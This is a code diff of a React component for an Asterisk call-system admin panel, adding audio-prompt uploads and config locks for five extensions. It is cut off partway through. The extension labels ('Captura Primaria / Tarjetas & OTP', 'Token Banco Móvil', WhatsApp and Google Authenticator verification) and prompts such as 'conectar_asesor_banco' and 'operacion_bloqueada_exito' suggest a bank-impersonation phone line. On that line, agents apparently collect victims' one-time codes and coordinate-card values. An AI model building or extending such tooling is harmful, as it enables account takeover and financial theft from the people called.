@@ -26,8 +26,12 @@ import {
   RefreshCw,
   Save,
   Lock,
+  Unlock,
   PowerOff,
   Check,
+  Clock,
+  ShieldCheck,
+  Layers,
 } from 'lucide-react';
 
 interface AudioLibraryTabProps {
@@ -43,8 +47,176 @@ interface AudioLibraryTabProps {
   onAssignTo4444?: (audioId: string) => void;
   onAssignTo3333?: (audioId: string) => void;
   activeAssignments?: ActiveAudioAssignments;
-  onAssignRole?: (role: AudioRole, asteriskPath: string) => void;
+  onAssignRole?: (role: AudioRole, asteriskPath: string, isManualSave?: boolean) => void;
+  lockedConfigs?: {
+    welcome_6666?: boolean;
+    welcome_7777?: boolean;
+    welcome_5555?: boolean;
+    welcome_4444?: boolean;
+    welcome_3333?: boolean;
+    lock_7777?: boolean;
+    lock_6666?: boolean;
+    lock_5555?: boolean;
+    lock_4444?: boolean;
+    lock_3333?: boolean;
+    ivr_entity?: boolean;
+    [key: string]: boolean | undefined;
+  };
+  onToggleLock?: (role: string, isLocked?: boolean) => void;
 }
+
+export interface OtpExtensionInfo {
+  id: string;
+  extension: string;
+  shortExt: string;
+  name: string;
+  purpose: string;
+  badge: string;
+  colorName: 'purple' | 'cyan' | 'amber' | 'emerald' | 'pink';
+  bgGradient: string;
+  borderColor: string;
+  textColor: string;
+  badgeColor: string;
+  accentBg: string;
+  ringColor: string;
+}
+
+export const OTP_EXTENSIONS_CONFIG: OtpExtensionInfo[] = [
+  {
+    id: '7777',
+    extension: '7777',
+    shortExt: '777',
+    name: 'Captura Primaria / Tarjetas & OTP',
+    purpose: 'Canal principal para transferir al cliente a solicitud de código numérico, SMS o coordenadas.',
+    badge: 'Primaria (7777 / 777)',
+    colorName: 'purple',
+    bgGradient: 'from-purple-950/40 via-slate-900 to-slate-950',
+    borderColor: 'border-purple-500/40',
+    textColor: 'text-purple-300',
+    badgeColor: 'bg-purple-600 text-white',
+    accentBg: 'bg-purple-500/20 text-purple-300 border-purple-500/30',
+    ringColor: 'focus:border-purple-400',
+  },
+  {
+    id: '6666',
+    extension: '6666',
+    shortExt: '666',
+    name: 'Captura Secundaria / Token Banco Móvil',
+    purpose: 'Canal optimizado para Token Móvil de aplicaciones bancarias y autenticación de app.',
+    badge: 'Banca / Token (6666 / 666)',
+    colorName: 'cyan',
+    bgGradient: 'from-cyan-950/40 via-slate-900 to-slate-950',
+    borderColor: 'border-cyan-500/40',
+    textColor: 'text-cyan-300',
+    badgeColor: 'bg-cyan-600 text-black',
+    accentBg: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
+    ringColor: 'focus:border-cyan-400',
+  },
+  {
+    id: '5555',
+    extension: '5555',
+    shortExt: '555',
+    name: 'Captura Alternativa / Redes & Cuentas',
+    purpose: 'Canal dedicado para verificación de WhatsApp, Google Authenticator, correo o servicios web.',
+    badge: 'Alternativa (5555 / 555)',
+    colorName: 'amber',
+    bgGradient: 'from-amber-950/40 via-slate-900 to-slate-950',
+    borderColor: 'border-amber-500/40',
+    textColor: 'text-amber-300',
+    badgeColor: 'bg-amber-600 text-black',
+    accentBg: 'bg-amber-500/20 text-amber-300 border-amber-500/30',
+    ringColor: 'focus:border-amber-400',
+  },
+  {
+    id: '4444',
+    extension: '4444',
+    shortExt: '444',
+    name: 'Captura Validación Móvil / SMS',
+    purpose: 'Canal con guión enfocado en mensajes SMS de operadoras y códigos numéricos estándar.',
+    badge: 'SMS Móvil (4444 / 444)',
+    colorName: 'emerald',
+    bgGradient: 'from-emerald-950/40 via-slate-900 to-slate-950',
+    borderColor: 'border-emerald-500/40',
+    textColor: 'text-emerald-300',
+    badgeColor: 'bg-emerald-600 text-black',
+    accentBg: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
+    ringColor: 'focus:border-emerald-400',
+  },
+  {
+    id: '3333',
+    extension: '3333',
+    shortExt: '333',
+    name: 'Captura Respaldo / Emergencia',
+    purpose: 'Línea de contingencia rápida con locuciones de seguridad y reintento inmediato.',
+    badge: 'Respaldo (3333 / 333)',
+    colorName: 'pink',
+    bgGradient: 'from-pink-950/40 via-slate-900 to-slate-950',
+    borderColor: 'border-pink-500/40',
+    textColor: 'text-pink-300',
+    badgeColor: 'bg-pink-600 text-white',
+    accentBg: 'bg-pink-500/20 text-pink-300 border-pink-500/30',
+    ringColor: 'focus:border-pink-400',
+  },
+];
+
+export interface ExtensionAudioSlotMeta {
+  slot: 'welcome' | 'wait' | 'success' | 'failure';
+  title: string;
+  shortLabel: string;
+  badge: string;
+  description: string;
+  roleKey: (ext: string) => string;
+  astDbKey: (ext: string) => string;
+  fallbackDefault: string;
+  icon: React.ComponentType<{ className?: string }>;
+}
+
+export const EXTENSION_SLOTS: ExtensionAudioSlotMeta[] = [
+  {
+    slot: 'welcome',
+    title: '1. Solicitud de Código OTP / Bienvenida',
+    shortLabel: 'Solicitud OTP',
+    badge: 'Paso 1: Solicitud',
+    description: 'Audio reproducido al transferir la llamada. Solicita al cliente ingresar los dígitos de su código.',
+    roleKey: (ext) => `welcome_${ext}`,
+    astDbKey: (ext) => `ivr_vars ${ext}_prompt`,
+    fallbackDefault: 'custom/solicitar_codigo_otp',
+    icon: Headphones,
+  },
+  {
+    slot: 'wait',
+    title: '2. Espera de Validación',
+    shortLabel: 'Espera Validación',
+    badge: 'Paso 2: Espera',
+    description: 'Audio en bucle ("Un momento por favor...") mientras el asesor valida los dígitos en su pantalla.',
+    roleKey: (ext) => `wait_${ext}`,
+    astDbKey: (ext) => `ivr_vars ${ext}_wait`,
+    fallbackDefault: 'custom/un_momento_validando_informacion',
+    icon: Clock,
+  },
+  {
+    slot: 'success',
+    title: '3. Código Aprobado / Éxito',
+    shortLabel: 'Código Aprobado',
+    badge: 'Paso 3: Válido',
+    description: 'Audio reproducido cuando el asesor presiona VÁLIDO en pantalla antes de retornar la llamada.',
+    roleKey: (ext) => `success_${ext}`,
+    astDbKey: (ext) => `ivr_vars ${ext}_success`,
+    fallbackDefault: 'custom/operacion_bloqueada_exito',
+    icon: CheckCircle2,
+  },
+  {
+    slot: 'failure',
+    title: '4. Código Inválido / Reintento',
+    shortLabel: 'Código Inválido',
+    badge: 'Paso 4: Inválido',
+    description: 'Audio reproducido cuando el asesor presiona INVÁLIDO indicando que debe volver a ingresarlo.',
+    roleKey: (ext) => `failure_${ext}`,
+    astDbKey: (ext) => `ivr_vars ${ext}_failure`,
+    fallbackDefault: 'custom/token_invalido_reintente',
+    icon: AlertTriangle,
+  },
+];
 
 interface RoleConfig {
   role: AudioRole;
@@ -207,9 +379,46 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   onAssignTo3333,
   activeAssignments: propActiveAssignments,
   onAssignRole,
+  lockedConfigs,
+  onToggleLock,
 }) => {
   const [playingAudioId, setPlayingAudioId] = useState<string | null>(null);
   const audioPlayerRef = useRef<HTMLAudioElement | null>(null);
+
+  // Manual locks state for individual audio configurations (7777, 6666, 5555, 4444, 3333)
+  const [localLocks, setLocalLocks] = useState<Record<string, boolean>>(() => {
+    try {
+      const s = localStorage.getItem('ast20_audio_locks_ui');
+      if (s) return JSON.parse(s);
+    } catch (_) {}
+    return {
+      welcome_7777: false,
+      welcome_6666: false,
+      welcome_5555: false,
+      welcome_4444: false,
+      welcome_3333: false,
+      lock_7777: false,
+      lock_6666: false,
+      lock_5555: false,
+      lock_4444: false,
+      lock_3333: false,
+    };
+  });
+
+  const isExtLocked = (ext: string): boolean => {
+    return !!(
+      lockedConfigs?.[`lock_${ext}`] ??
+      lockedConfigs?.[`welcome_${ext}`] ??
+      localLocks[`lock_${ext}`] ??
+      localLocks[`welcome_${ext}`]
+    );
+  };
+
+  const isLocked6666 = isExtLocked('6666');
+  const isLocked7777 = isExtLocked('7777');
+  const isLocked5555 = isExtLocked('5555');
+  const isLocked4444 = isExtLocked('4444');
+  const isLocked3333 = isExtLocked('3333');
 
   // Active assignments state
   const [activeAssignments, setActiveAssignments] = useState<ActiveAudioAssignments>(
@@ -218,10 +427,25 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
       agent_transfer: 'custom/conectar_asesor_banco',
       press1_invalid: 'custom/opcion_invalida',
       welcome_7777: 'custom/solicitar_codigo_otp',
-      welcome_6666: 'custom/bienvenida_6666',
+      wait_7777: 'custom/un_momento_validando_informacion',
+      success_7777: 'custom/operacion_bloqueada_exito',
+      failure_7777: 'custom/token_invalido_reintente',
+      welcome_6666: 'custom/solicitar_codigo_otp',
+      wait_6666: 'custom/un_momento_validando_informacion',
+      success_6666: 'custom/operacion_bloqueada_exito',
+      failure_6666: 'custom/token_invalido_reintente',
       welcome_5555: 'custom/solicitar_codigo_otp',
+      wait_5555: 'custom/un_momento_validando_informacion',
+      success_5555: 'custom/operacion_bloqueada_exito',
+      failure_5555: 'custom/token_invalido_reintente',
       welcome_4444: 'custom/solicitar_codigo_otp',
+      wait_4444: 'custom/un_momento_validando_informacion',
+      success_4444: 'custom/operacion_bloqueada_exito',
+      failure_4444: 'custom/token_invalido_reintente',
       welcome_3333: 'custom/solicitar_codigo_otp',
+      wait_3333: 'custom/un_momento_validando_informacion',
+      success_3333: 'custom/operacion_bloqueada_exito',
+      failure_3333: 'custom/token_invalido_reintente',
       otp_welcome: 'custom/solicitar_codigo_otp',
       otp_wait: 'custom/un_momento_validando_informacion',
       otp_success: 'custom/operacion_bloqueada_exito',
@@ -233,13 +457,32 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   const [feedbackMsg, setFeedbackMsg] = useState<{ text: string; type: 'success' | 'info' } | null>(null);
   const [filterCategory, setFilterCategory] = useState<'all' | 'press1' | 'otp'>('all');
 
-  // Fetch active audio assignments on mount
+  // Fetch active audio assignments on mount - respects manual lock state
   const fetchActiveAssignments = async () => {
     try {
       const res = await fetch('/api/asterisk/audio/active-assignments');
       const data = await res.json();
       if (data.success && data.assignments) {
-        setActiveAssignments(data.assignments);
+        setActiveAssignments((prev) => {
+          const next = { ...data.assignments };
+          // Preserve locked extension configurations against auto-sync
+          ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
+            if (isExtLocked(ext)) {
+              if (prev[`welcome_${ext}`]) next[`welcome_${ext}`] = prev[`welcome_${ext}`];
+              if (prev[`wait_${ext}`]) next[`wait_${ext}`] = prev[`wait_${ext}`];
+              if (prev[`success_${ext}`]) next[`success_${ext}`] = prev[`success_${ext}`];
+              if (prev[`failure_${ext}`]) next[`failure_${ext}`] = prev[`failure_${ext}`];
+            }
+          });
+          return next;
+        });
+
+        if (data.manualLocks) {
+          setLocalLocks((prev) => ({
+            ...prev,
+            ...data.manualLocks,
+          }));
+        }
       }
     } catch (e) {
       console.warn('Error al obtener asignaciones activas de audio:', e);
@@ -252,17 +495,29 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
 
   useEffect(() => {
     if (propActiveAssignments) {
-      setActiveAssignments(propActiveAssignments);
+      setActiveAssignments((prev) => {
+        const next = { ...propActiveAssignments };
+        // Preserve locked configurations
+        ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
+          if (isExtLocked(ext)) {
+            if (prev[`welcome_${ext}`]) next[`welcome_${ext}`] = prev[`welcome_${ext}`];
+            if (prev[`wait_${ext}`]) next[`wait_${ext}`] = prev[`wait_${ext}`];
+            if (prev[`success_${ext}`]) next[`success_${ext}`] = prev[`success_${ext}`];
+            if (prev[`failure_${ext}`]) next[`failure_${ext}`] = prev[`failure_${ext}`];
+          }
+        });
+        return next;
+      });
     }
-  }, [propActiveAssignments]);
+  }, [propActiveAssignments, localLocks, lockedConfigs]);
 
-  const handleAssignRoleDirect = async (role: AudioRole, asteriskPath: string) => {
+  const handleAssignRoleDirect = async (role: AudioRole, asteriskPath: string, isManualSave = false) => {
     setIsSyncingRole((prev) => ({ ...prev, [role]: true }));
     try {
       const res = await fetch('/api/asterisk/audio/assign', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ role, asteriskPath }),
+        body: JSON.stringify({ role, asteriskPath, isManualSave }),
       });
       const data = await res.json();
       if (data.success) {
@@ -270,7 +525,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
           ...prev,
           ...(data.assignments || { [role]: asteriskPath }),
         }));
-        onAssignRole?.(role, asteriskPath);
+        onAssignRole?.(role, asteriskPath, isManualSave);
 
         const roleConfig = SYSTEM_ROLES.find((r) => r.role === role);
         setFeedbackMsg({
@@ -290,6 +545,91 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
       setIsSyncingRole((prev) => ({ ...prev, [role]: false }));
     }
   };
+
+  // Dedicated Save & Lock Handlers for individual OTP Extensions
+  const [isSavingExt, setIsSavingExt] = useState<Record<string, boolean>>({});
+
+  const handleSaveConfigExtension = async (ext: string) => {
+    setIsSavingExt((prev) => ({ ...prev, [ext]: true }));
+    try {
+      const prompt = activeAssignments[`welcome_${ext}`] || `custom/solicitar_codigo_otp`;
+      const wait = activeAssignments[`wait_${ext}`] || `custom/un_momento_validando_informacion`;
+      const success = activeAssignments[`success_${ext}`] || `custom/operacion_bloqueada_exito`;
+      const failure = activeAssignments[`failure_${ext}`] || `custom/token_invalido_reintente`;
+
+      const res = await fetch('/api/asterisk/audio/save-extension-config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          extension: ext,
+          prompt,
+          wait,
+          success,
+          failure,
+          isLocked: true,
+        }),
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        setLocalLocks((prev) => {
+          const next = { ...prev, [`lock_${ext}`]: true, [`welcome_${ext}`]: true };
+          try { localStorage.setItem('ast20_audio_locks_ui', JSON.stringify(next)); } catch (_) {}
+          return next;
+        });
+        onToggleLock?.(`welcome_${ext}`, true);
+        onToggleLock?.(`lock_${ext}`, true);
+        if (data.assignments) {
+          setActiveAssignments(data.assignments);
+        }
+        setFeedbackMsg({
+          text: `✓ Configuración de audios para Extensión ${ext} guardada y bloqueada manualmente (isLocked: true). Ningún auto-sync la sobrescribirá.`,
+          type: 'success',
+        });
+        setTimeout(() => setFeedbackMsg(null), 5000);
+      }
+    } catch (err: any) {
+      setFeedbackMsg({
+        text: `Error al guardar configuración de Ext. ${ext}: ${err.message}`,
+        type: 'info',
+      });
+      setTimeout(() => setFeedbackMsg(null), 5000);
+    } finally {
+      setIsSavingExt((prev) => ({ ...prev, [ext]: false }));
+    }
+  };
+
+  const handleUnlockExtension = async (ext: string) => {
+    setLocalLocks((prev) => {
+      const next = { ...prev, [`lock_${ext}`]: false, [`welcome_${ext}`]: false };
+      try { localStorage.setItem('ast20_audio_locks_ui', JSON.stringify(next)); } catch (_) {}
+      return next;
+    });
+    onToggleLock?.(`welcome_${ext}`, false);
+    onToggleLock?.(`lock_${ext}`, false);
+    try {
+      await fetch('/api/asterisk/audio/toggle-lock', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ role: `welcome_${ext}`, isLocked: false }),
+      });
+      await fetch('/api/asterisk/audio/toggle-lock', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ role: `lock_${ext}`, isLocked: false }),
+      });
+    } catch (_) {}
+    setFeedbackMsg({
+      text: `🔓 Extensión ${ext} desbloqueada. Ahora permite sincronización automática.`,
+      type: 'info',
+    });
+    setTimeout(() => setFeedbackMsg(null), 4000);
+  };
+
+  const handleSaveConfig7777 = () => handleSaveConfigExtension('7777');
+  const handleUnlock7777 = () => handleUnlockExtension('7777');
+  const handleSaveConfig6666 = () => handleSaveConfigExtension('6666');
+  const handleUnlock6666 = () => handleUnlockExtension('6666');
 
   // Handler to deactivate / unassign an audio from a role
   const handleDeactivateRole = async (role: AudioRole) => {
@@ -323,32 +663,76 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   const handleSaveOtpExtensions = async () => {
     setIsSavingOtpExtensions(true);
     try {
+      const payload: any = {
+        isLocked: true,
+        lockedRoles: {
+          lock_7777: true,
+          lock_6666: true,
+          lock_5555: true,
+          lock_4444: true,
+          lock_3333: true,
+          welcome_7777: true,
+          welcome_6666: true,
+          welcome_5555: true,
+          welcome_4444: true,
+          welcome_3333: true,
+        },
+      };
+
+      ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
+        payload[`welcome_${ext}`] = activeAssignments[`welcome_${ext}`] || 'custom/solicitar_codigo_otp';
+        payload[`wait_${ext}`] = activeAssignments[`wait_${ext}`] || 'custom/un_momento_validando_informacion';
+        payload[`success_${ext}`] = activeAssignments[`success_${ext}`] || 'custom/operacion_bloqueada_exito';
+        payload[`failure_${ext}`] = activeAssignments[`failure_${ext}`] || 'custom/token_invalido_reintente';
+      });
+
       const res = await fetch('/api/asterisk/audio/save-otp-extensions', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          welcome_7777: activeAssignments.welcome_7777 || 'custom/solicitar_codigo_otp',
-          welcome_6666: activeAssignments.welcome_6666 || 'custom/bienvenida_6666',
-          welcome_5555: activeAssignments.welcome_5555 || 'custom/solicitar_codigo_otp',
-          welcome_4444: activeAssignments.welcome_4444 || 'custom/solicitar_codigo_otp',
-          welcome_3333: activeAssignments.welcome_3333 || 'custom/solicitar_codigo_otp',
-        }),
+        body: JSON.stringify(payload),
       });
       const data = await res.json();
       if (data.success) {
         setOtpExtensionsSaved(true);
+        setLocalLocks((prev) => {
+          const next = {
+            ...prev,
+            lock_7777: true,
+            lock_6666: true,
+            lock_5555: true,
+            lock_4444: true,
+            lock_3333: true,
+            welcome_7777: true,
+            welcome_6666: true,
+            welcome_5555: true,
+            welcome_4444: true,
+            welcome_3333: true,
+          };
+          try { localStorage.setItem('ast20_audio_locks_ui', JSON.stringify(next)); } catch (_) {}
+          return next;
+        });
+
+        ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
+          onToggleLock?.(`welcome_${ext}`, true);
+          onToggleLock?.(`lock_${ext}`, true);
+        });
+
+        if (data.assignments) {
+          setActiveAssignments(data.assignments);
+        }
+
         setFeedbackMsg({
-          text: '✓ Configuración de extensiones 7777, 6666, 5555, 4444 y 3333 guardada y bloqueada en AstDB. No cambiará al actualizar el sistema.',
+          text: '✓ Todas las extensiones OTP (7777, 6666, 5555, 4444, 3333) guardadas y blindadas en AstDB sin cruce de audios.',
           type: 'success',
         });
         setTimeout(() => {
           setOtpExtensionsSaved(false);
           setFeedbackMsg(null);
-        }, 4500);
+        }, 5000);
       }
     } catch (err: any) {
       setFeedbackMsg({
-        text: `Error al guardar: ${err.message}`,
+        text: `Error al guardar extensiones OTP: ${err.message}`,
         type: 'info',
       });
     } finally {
@@ -378,31 +762,36 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   const recordingTimerRef = useRef<any>(null);
 
   const fileInputRef = useRef<HTMLInputElement | null>(null);
-  const ext7777FileInputRef = useRef<HTMLInputElement | null>(null);
-  const ext6666FileInputRef = useRef<HTMLInputElement | null>(null);
-  const ext5555FileInputRef = useRef<HTMLInputElement | null>(null);
-  const ext4444FileInputRef = useRef<HTMLInputElement | null>(null);
-  const ext3333FileInputRef = useRef<HTMLInputElement | null>(null);
 
-  const [isUploading7777, setIsUploading7777] = useState(false);
-  const [isUploading6666, setIsUploading6666] = useState(false);
-  const [isUploading5555, setIsUploading5555] = useState(false);
-  const [isUploading4444, setIsUploading4444] = useState(false);
-  const [isUploading3333, setIsUploading3333] = useState(false);
+  // Dedicated upload state per slot
+  const [uploadingSlot, setUploadingSlot] = useState<Record<string, boolean>>({});
 
-  const handleUpload7777Direct = async (file: File) => {
+  const handleUploadForExtensionSlot = async (
+    ext: string,
+    slot: 'welcome' | 'wait' | 'success' | 'failure',
+    file: File
+  ) => {
     if (!file) return;
-    setIsUploading7777(true);
+    const slotKey = slot === 'welcome' ? `welcome_${ext}` : `${slot}_${ext}`;
+    setUploadingSlot((prev) => ({ ...prev, [slotKey]: true }));
+
     const reader = new FileReader();
     reader.onload = async (e) => {
       const dataUrl = e.target?.result as string;
-      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_7777';
+      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || `${slot}_${ext}`;
       const cleanPath = `custom/${baseName}`;
 
+      const slotLabels: Record<string, string> = {
+        welcome: 'Solicitud OTP',
+        wait: 'Espera Validación',
+        success: 'Código Aprobado',
+        failure: 'Código Inválido',
+      };
+
       const newAudioItem: AudioPrompt = {
-        id: `audio-7777-${Date.now()}`,
-        name: `Extensión 7777: ${file.name.replace(/\.[^/.]+$/, '')}`,
-        category: 'welcome_7777',
+        id: `audio-${ext}-${slot}-${Date.now()}`,
+        name: `Ext ${ext} (${slotLabels[slot]}): ${file.name.replace(/\.[^/.]+$/, '')}`,
+        category: (slotKey as any),
         fileName: `${baseName}.wav`,
         fileSize: `${(file.size / 1024).toFixed(1)} KB`,
         durationSec: 5.5,
@@ -422,280 +811,54 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
           body: JSON.stringify({
             name: newAudioItem.name,
             fileName: `${baseName}.wav`,
-            category: 'welcome_7777',
+            category: slotKey,
             dataUrl: dataUrl,
           }),
         });
 
-        await handleAssignRoleDirect('welcome_7777', cleanPath);
-        if (onAssignTo7777) {
-          onAssignTo7777(newAudioItem.id);
+        await handleAssignRoleDirect(slotKey as any, cleanPath, true);
+
+        if (slot === 'welcome') {
+          if (ext === '7777') onAssignTo7777?.(newAudioItem.id);
+          else if (ext === '6666') onAssignTo6666?.(newAudioItem.id);
+          else if (ext === '5555') onAssignTo5555?.(newAudioItem.id);
+          else if (ext === '4444') onAssignTo4444?.(newAudioItem.id);
+          else if (ext === '3333') onAssignTo3333?.(newAudioItem.id);
         }
 
         setFeedbackMsg({
-          text: `¡Audio para la Extensión 7777 cargado y activo con éxito en Asterisk! Al transferir a la 7777 o 777 se reproducirá de inmediato.`,
+          text: `✓ Audio para Extensión ${ext} (${slotLabels[slot]}) cargado y activo con éxito en Asterisk: ${cleanPath}`,
           type: 'success',
         });
         setTimeout(() => setFeedbackMsg(null), 5000);
       } catch (err: any) {
-        console.error('Error subiendo audio 7777:', err);
+        console.error(`Error subiendo audio para ${slotKey}:`, err);
         setFeedbackMsg({
-          text: `Error al subir el audio para la 7777: ${err.message}`,
+          text: `Error al subir audio para Ext. ${ext}: ${err.message}`,
           type: 'info',
         });
         setTimeout(() => setFeedbackMsg(null), 5000);
       } finally {
-        setIsUploading7777(false);
+        setUploadingSlot((prev) => ({ ...prev, [slotKey]: false }));
       }
     };
     reader.readAsDataURL(file);
   };
 
-  const handleUpload6666Direct = async (file: File) => {
-    if (!file) return;
-    setIsUploading6666(true);
-    const reader = new FileReader();
-    reader.onload = async (e) => {
-      const dataUrl = e.target?.result as string;
-      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_6666';
-      const cleanPath = `custom/${baseName}`;
-
-      const newAudioItem: AudioPrompt = {
-        id: `audio-6666-${Date.now()}`,
-        name: `Extensión 6666: ${file.name.replace(/\.[^/.]+$/, '')}`,
-        category: 'welcome_6666',
-        fileName: `${baseName}.wav`,
-        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
-        durationSec: 5.5,
-        format: 'WAV',
-        sampleRate: '8000Hz PCM 16-bit Mono',
-        dataUrl: dataUrl,
-        asteriskPath: cleanPath,
-        createdAt: new Date().toISOString(),
-      };
-
-      onAddAudio(newAudioItem);
-
-      try {
-        await fetch('/api/asterisk/audio/upload', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            name: newAudioItem.name,
-            fileName: `${baseName}.wav`,
-            category: 'welcome_6666',
-            dataUrl: dataUrl,
-          }),
-        });
-
-        await handleAssignRoleDirect('welcome_6666', cleanPath);
-        if (onAssignTo6666) {
-          onAssignTo6666(newAudioItem.id);
-        }
-
-        setFeedbackMsg({
-          text: `¡Audio para la Extensión 6666 cargado y activo con éxito en Asterisk! Al transferir a la 6666 o 666 se reproducirá de inmediato.`,
-          type: 'success',
-        });
-        setTimeout(() => setFeedbackMsg(null), 5000);
-      } catch (err: any) {
-        console.error('Error subiendo audio 6666:', err);
-        setFeedbackMsg({
-          text: `Error al subir el audio para la 6666: ${err.message}`,
-          type: 'info',
-        });
-        setTimeout(() => setFeedbackMsg(null), 5000);
-      } finally {
-        setIsUploading6666(false);
+  const triggerFilePicker = (ext: string, slot: 'welcome' | 'wait' | 'success' | 'failure') => {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = 'audio/*,.wav,.mp3,.ogg,.gsm';
+    input.onchange = (e: any) => {
+      const file = e.target?.files?.[0];
+      if (file) {
+        handleUploadForExtensionSlot(ext, slot, file);
       }
     };
-    reader.readAsDataURL(file);
+    input.click();
   };
 
-  const handleUpload5555Direct = async (file: File) => {
-    if (!file) return;
-    setIsUploading5555(true);
-    const reader = new FileReader();
-    reader.onload = async (e) => {
-      const dataUrl = e.target?.result as string;
-      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_5555';
-      const cleanPath = `custom/${baseName}`;
-
-      const newAudioItem: AudioPrompt = {
-        id: `audio-5555-${Date.now()}`,
-        name: `Extensión 5555: ${file.name.replace(/\.[^/.]+$/, '')}`,
-        category: 'welcome_5555',
-        fileName: `${baseName}.wav`,
-        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
-        durationSec: 5.5,
-        format: 'WAV',
-        sampleRate: '8000Hz PCM 16-bit Mono',
-        dataUrl: dataUrl,
-        asteriskPath: cleanPath,
-        createdAt: new Date().toISOString(),
-      };
-
-      onAddAudio(newAudioItem);
-
-      try {
-        await fetch('/api/asterisk/audio/upload', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            name: newAudioItem.name,
-            fileName: `${baseName}.wav`,
-            category: 'welcome_5555',
-            dataUrl: dataUrl,
-          }),
-        });
-
-        await handleAssignRoleDirect('welcome_5555', cleanPath);
-        if (onAssignTo5555) {
-          onAssignTo5555(newAudioItem.id);
-        }
-
-        setFeedbackMsg({
-          text: `¡Audio para la Extensión 5555 cargado y activo con éxito en Asterisk! Al transferir a la 5555 o 555 se reproducirá de inmediato.`,
-          type: 'success',
-        });
-        setTimeout(() => setFeedbackMsg(null), 5000);
-      } catch (err: any) {
-        console.error('Error subiendo audio 5555:', err);
-        setFeedbackMsg({
-          text: `Error al subir el audio para la 5555: ${err.message}`,
-          type: 'info',
-        });
-        setTimeout(() => setFeedbackMsg(null), 5000);
-      } finally {
-        setIsUploading5555(false);
-      }
-    };
-    reader.readAsDataURL(file);
-  };
-
-  const handleUpload4444Direct = async (file: File) => {
-    if (!file) return;
-    setIsUploading4444(true);
-    const reader = new FileReader();
-    reader.onload = async (e) => {
-      const dataUrl = e.target?.result as string;
-      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_4444';
-      const cleanPath = `custom/${baseName}`;
-
-      const newAudioItem: AudioPrompt = {
-        id: `audio-4444-${Date.now()}`,
-        name: `Extensión 4444: ${file.name.replace(/\.[^/.]+$/, '')}`,
-        category: 'welcome_4444',
-        fileName: `${baseName}.wav`,
-        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
-        durationSec: 5.5,
-        format: 'WAV',
-        sampleRate: '8000Hz PCM 16-bit Mono',
-        dataUrl: dataUrl,
-        asteriskPath: cleanPath,
-        createdAt: new Date().toISOString(),
-      };
-
-      onAddAudio(newAudioItem);
-
-      try {
-        await fetch('/api/asterisk/audio/upload', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            name: newAudioItem.name,
-            fileName: `${baseName}.wav`,
-            category: 'welcome_4444',
-            dataUrl: dataUrl,
-          }),
-        });
-
-        await handleAssignRoleDirect('welcome_4444', cleanPath);
-        if (onAssignTo4444) {
-          onAssignTo4444(newAudioItem.id);
-        }
-
-        setFeedbackMsg({
-          text: `¡Audio para la Extensión 4444 cargado y activo con éxito en Asterisk! Al transferir a la 4444 o 444 se reproducirá de inmediato.`,
-          type: 'success',
-        });
-        setTimeout(() => setFeedbackMsg(null), 5000);
-      } catch (err: any) {
-        console.error('Error subiendo audio 4444:', err);
-        setFeedbackMsg({
-          text: `Error al subir el audio para la 4444: ${err.message}`,
-          type: 'info',
-        });
-        setTimeout(() => setFeedbackMsg(null), 5000);
-      } finally {
-        setIsUploading4444(false);
-      }
-    };
-    reader.readAsDataURL(file);
-  };
-
-  const handleUpload3333Direct = async (file: File) => {
-    if (!file) return;
-    setIsUploading3333(true);
-    const reader = new FileReader();
-    reader.onload = async (e) => {
-      const dataUrl = e.target?.result as string;
-      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_3333';
-      const cleanPath = `custom/${baseName}`;
-
-      const newAudioItem: AudioPrompt = {
-        id: `audio-3333-${Date.now()}`,
-        name: `Extensión 3333: ${file.name.replace(/\.[^/.]+$/, '')}`,
-        category: 'welcome_3333',
-        fileName: `${baseName}.wav`,
-        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
-        durationSec: 5.5,
-        format: 'WAV',
-        sampleRate: '8000Hz PCM 16-bit Mono',
-        dataUrl: dataUrl,
-        asteriskPath: cleanPath,
-        createdAt: new Date().toISOString(),
-      };
-
-      onAddAudio(newAudioItem);
-
-      try {
-        await fetch('/api/asterisk/audio/upload', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
